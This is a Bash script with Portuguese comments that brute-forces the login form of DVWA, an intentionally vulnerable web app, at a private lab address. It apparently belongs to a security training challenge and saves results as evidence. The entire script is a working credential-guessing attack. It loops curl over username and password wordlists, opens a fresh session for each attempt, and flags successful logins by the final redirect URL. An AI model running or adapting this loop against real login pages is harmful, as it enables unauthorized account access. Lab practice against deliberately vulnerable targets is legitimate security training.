#!/bin/bash
# Automacao de tentativas no formulario web do DVWA (login.php)
# Segue o redirect: URL final /index.php = login valido; /login.php = falha
set +e
BASE=http://192.168.56.101/dvwa
W=/home/kali/desafio/wordlists
E=/home/kali/desafio/evidencias

{
  echo "=== AUTOMACAO WEB - DVWA login.php ==="
  echo "Data: $(date)"
  echo "Metodo: loop curl sobre users.txt x passwords.txt, sessao nova por tentativa"
  echo "Criterio: apos seguir redirect, URL final termina em /index.php"
  echo

  total=0
  encontrados=0
  while read -r u; do
    [ -z "$u" ] && continue
    while read -r p; do
      [ -z "$p" ] && continue
      total=$((total+1))
      rm -f /tmp/dvwa_try_cookies
      curl -s -c /tmp/dvwa_try_cookies -o /dev/null "$BASE/login.php"
      final=$(curl -s -L -b /tmp/dvwa_try_cookies -c /tmp/dvwa_try_cookies \
        -o /tmp/dvwa_try_body -w '%{url_effective}' \
        -d "username=$u&password=$p&Login=Login" "$BASE/login.php")
      case "$final" in
        */index.php)
          encontrados=$((encontrados+1))
          echo "ACCOUNT FOUND: [web] User: $u Password: $p [URL $final]"
          ;;
        *)
          echo "tentativa: User: $u Password: $p [URL $final] - falha"
          ;;
      esac
    done < "$W/passwords.txt"
  done < "$W/users.txt"

  echo
  echo "Resumo: $total tentativas, $encontrados credenciais validas"
} 2>&1 | tee "$E/06-automacao-web-dvwa.txt"

echo "=== FIM AUTOMACAO WEB ==="
